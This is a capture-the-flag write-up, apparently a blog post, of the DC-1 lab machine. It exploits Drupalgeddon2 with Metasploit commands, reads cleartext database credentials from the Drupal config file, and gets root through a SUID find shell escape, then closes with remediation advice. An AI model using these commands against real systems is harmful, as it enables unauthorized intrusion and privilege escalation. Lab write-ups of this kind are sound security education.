# DC-1

From unpatched CMS flaws to SUID privilege escalation, we sweep the house to find every hidden flag. 100% completion rooted in precision…

***

### 🛡️ Unearthing the Truth in DC-1 | From Drupalgeddon to Root 🛡️

#### From unpatched CMS flaws to SUID privilege escalation, we sweep the house to find every hidden flag. 100% completion rooted in precision and faith. 🎯🙏

![](https://cdn-images-1.medium.com/max/800/1*L9G78VPBO7C73svC6VDpRA.png)

**Target**: _DC-1 (192.168.239.193)_\[PG OffSec] **OS:** _Linux (Debian 7)_ **Difficulty:** Easy **Attack Vectors:** _Drupalgeddon2 (RCE) -> Database Credential Reuse -> SUID Privilege Escalation._

### Executive Summary

**Assessment Date:** _January 22, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h\Nicholas Mullenski_

#### Overview

An assessment of the “DC-1” server revealed a critical vulnerability in the Content Management System that led to a full system compromise. The server, running an outdated version of Drupal 7, was susceptible to the “Drupalgeddon2” exploit. This allowed for unauthenticated remote code execution, which was further leveraged through insecure configuration files and misconfigured system binaries to achieve total administrative control (Root).\
**Key Findings:**

* **Unauthenticated Remote Code Execution:** The Drupal 7 installation was vulnerable to CVE-2018–7600 (Drupalgeddon2). This allowed an unauthenticated attacker to execute arbitrary PHP code via the Form API, resulting in an initial low-privileged shell (www-data).
* **Cleartext Credentials:** Post-exploitation enumeration of the web root revealed the sites/default/settings.php file containing cleartext database credentials (dbuser / R0ck3t). These credentials permitted access to the backend database to manually reset the administrative password.
* **Privilege Escalation:** The /usr/bin/find binary was configured with the SUID bit enabled. This misconfiguration allowed an authenticated user to execute system commands as Root using the -exec flag, leading to full system compromise.

#### Strategic Recommendation

Immediate patching of the Drupal CMS to the latest secure version is required to mitigate Remote Code Execution risks. Additionally, the SUID bit must be removed from the find binary to prevent privilege escalation, and sensitive configuration files should be restricted to read-only access for the root user.

### 1.0 Initial Foothold

#### 1.1 Enumeration & Reconnaissance

The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.

**1.1.1 Nmap Scan** a full service and script scan was performed to identify open ports and the software versions running on them.

```
nmap -sCV -vvv -Pn 192.168.239.193

Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI1NiSeZ5dkSttUT5BvkRgdQ0Ll7uF//UJCPnySOrC1vg62DWq/Dn1ktunFd09FT5Nm/ZP9BHlaW5hftzUdtYUQRKfazWfs6g5glPJQSVUqnlNwVUBA46qS65p4hXHkkl5QO0OHzs8dovwe3e+doYiHTRZ9nnlNGbkrg7yRFQLKPAAAAFQC5qj0MICUmhO3Gj+VCqf3aHsiRdQAAAIAoVp13EkVwBtQQJnS5mY4vPR5A9kK3DqAQmj4XP1GAn16r9rSLUFffz/ONrDWflFrmoPbxzRhpgNpHx9hZpyobSyOkEU3b/hnE/hdq3dygHLZ3adaFIdNVG4U8P9ZHuVUk0vHvsu2qYt5MJs0k1A+pXKFc9n06/DEU0rnNo+mMKwAAAIA/Y//BwzC2IlByd7g7eQiXgZC2pGE4RgO1pQCNo9IM4ZkV1MxH3/WVCdi27fjAbLQ+32cGIzjsgFhzFoJ+vfSYZTI+avqU0N86qT+mDCGCSeyAbOoNq52WtzWId1mqDoOzu7qG52HarRmxQlvbmtifYYTZCJWJcYla2GAsqUGFHw==
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbDC/6BDEUIa7NP87jp5dQh/rJpDQz5JBGpFRHXa+jb5aEd/SgvWKIlMjUDoeIMjdzmsNhwCRYAoY7Qq2OrrRh2kIvQipyohWB8nImetQe52QG6+LHDKXiiEFJRHg9AtsgE2Mt9RAg2RvSlXfGbWXgobiKw3RqpFtk/gK66C0SJE4MkKZcQNNQeC5dzYtVQqfNh9uUb1FjQpvpEkOnCmiTqFxlqzHp/T1AKZ4RKED/ShumJcQknNe/WOD1ypeDeR+BUixiIoq+fR+grQB9GC3TcpWYI0IrC5ESe3mSyeHmR8yYTVIgbIN5RgEiOggWpeIPXgajILPkHThWdXf70fiv
|   256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKUNN60T4EOFHGiGdFU1ljvBlREaVWgZvgWlkhSKutr8l75VBlGbgTaFBcTzWrPdRItKooYsejeC80l5nEnKkNU=

80/tcp  open  http    syn-ack ttl 61 Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-title: Welcome to Drupal Site | Drupal Site
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)

111/tcp open  rpcbind syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41274/tcp6  status
|   100024  1          41720/tcp   status
|   100024  1          49941/udp6  status
|_  100024  1          54030/udp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

#### Key Findings:

* **Port 22 (SSH):** OpenSSH 6.0p1 (Debian). Generally secure unless weak credentials are found.
* **Port 80 (HTTP)**: Apache 2.2.22 running Drupal 7. This is the primary point of interest.
* **Port 111 (RPC):** rpcbind. Useful for identifying further network services, but usually secondary to web vulnerabilities.

#### **1.2 Web Application Analysis**

**1.2.1** Further inspection of the web service on port 80 confirmed the presence of a Drupal installation.

![](https://cdn-images-1.medium.com/max/800/1*7RT6HQzf-_C8_nWBl2SB3g.png)

* **Generator:** Drupal 7
* **Robots.txt:** Revealed standard Drupal directories (e.g., /includes/, /modules/, /admin/), confirming the CMS structure is intact and likely default.

![](https://cdn-images-1.medium.com/max/800/1*JVvQbdk5yk8CtqJiYWqa9Q.png)

**1.2.2 Vulnerability Identification:** Drupalgeddon

* Drupal 7 is famously vulnerable to Drupalgeddon2 (CVE-2018–7600), an unauthenticated remote code execution (RCE) vulnerability that occurs due to insufficient input validation on Form API (render arrays).

### 2.0 Exploitation

#### 2.1 Gaining a Foothold (Drupalgeddon2)

**2.1.1 The vulnerability** identified is CVE-2018–7600, a highly critical Remote Code Execution (RCE) vulnerability. It exists because Drupal 7 does not properly sanitize render arrays in its Form API, allowing an attacker to inject malicious PHP functions into the server’s processing logic.

**2.1.2 Exploitation via Metasploit**

* Since this is a common lab machine, we will use the Metasploit Framework for a stable, interactive shell.

Commands:

* `mfsconsole`
* `use exploit/unix/webapp/drupal_drupalgeddon2`
* `set RHOSTS 192.168.239.193`
* `set LHOST tun0`
* `exploit`

### 3.0 Internal Enumeration

#### 3.2 Finding the Flags

**3.2.1 Flag 1: Web Root:** Located in the web root, this file provided the hint: “Every good CMS needs a config file — and so do you.”

**Command:** `cat flag1.txt`

![](https://cdn-images-1.medium.com/max/800/1*R1iXAkm5wt54bz1ur_s7uQ.png)

**3.2.2 Flag 2: Drupal Configuration**

* Following the hint, the Drupal settings file was found at ./sites/default/settings.php. It contained Flag 2 and database credentials:

![](https://cdn-images-1.medium.com/max/800/1*_1LOKjMBNsy12DZLCkbalw.png)

**3.2.3 Flag 3: Administrative Dashboard**

* After using the Drupal password-hash script to reset the admin password, Flag 3 was found by navigating to the Content section of the web dashboard.

Hint: “Special PERMS will help FIND the passwd — but you’ll need to -exec that command to work out how to get what’s in the shadow.”

![](https://cdn-images-1.medium.com/max/800/1*FKBqRlWWqoK2ihzxcsTOuA.png)

### 4.0 Privilege Escalation

#### 4.1 Exploiting SUID Binaries

**4.1.1 Following** the hint in Flag 3, a search for SUID binaries was conducted.

* Command: `find / -perm -u=s -type f 2>/dev/null`

![](https://cdn-images-1.medium.com/max/800/1*0iVsaY3y0QHQBhpV4MJCUQ.png)

**Discovery:** The /usr/bin/find binary was identified as having the SUID bit set.

#### 4.2 Gaining Root Access

**4.2.1 Using the SUID** find binary, a root shell was spawned by executing /bin/sh.

**Command:** `find . -exec /bin/sh \; -quit`

**Verification:** `whoami` returned `root`.

![](https://cdn-images-1.medium.com/max/800/1*75VYmeIZawDe3iR9_qm_8Q.png)

#### 4.3 Local & Root Flags

**4.3.1 User Proof (local.txt)**

* The user-level hash was located directly at the root of the home directory rather than within a specific user’s folder.

**Exact Path:** `/home/local.txt`

**Discovery Method**: Full filesystem search using the SUID find binary.

**4.2 Root Proof (proof.txt)**

* The root-level hash was retrieved from the administrative home directory.

Exact Path: `/root/proof.txt`

**Discovery Method:** Direct directory access following successful privilege escalation to root.

### 5.0 Lessons Learned & Mitigation

* **Vulnerable Service:** An outdated Drupal 7 installation allowed for unauthenticated Remote Code Execution (RCE).
* **Weak Permissions:** The find binary was configured with the SUID bit, allowing a low-privileged user to execute commands as root.
* **Remediation:** Admins must patch Drupal to the latest security version and audit SUID permissions using find / -perm -u=s to ensure the principle of least privilege is maintained.

### The Scriptural Connection

As we finish this lab and document the final path, we reflect on the importance of accurate knowledge and finding exactly what is hidden.

**Colossians 1:9**

> “And so, from the day we heard, we have not ceased to pray for you, asking that you may be filled with the knowledge of his will in all spiritual wisdom and understanding.”

**The Connection:** In a lab, “guessing” isn’t enough; you need the exact “knowledge” of where the flag is to complete the mission. In our R00t3dbyFa17h walk, we seek that same level of precision and “spiritual wisdom” so we aren’t led astray by assumptions. You swept the house, found the exact path, and now the truth of the system’s compromise is fully understood.

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [February 28, 2026](https://medium.com/p/8cb0f626ebee).

[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-unearthing-the-truth-in-dc-1-from-drupalgeddon-to-root-%EF%B8%8F-8cb0f626ebee)

Exported from [Medium](https://medium.com) on September 1, 2026.
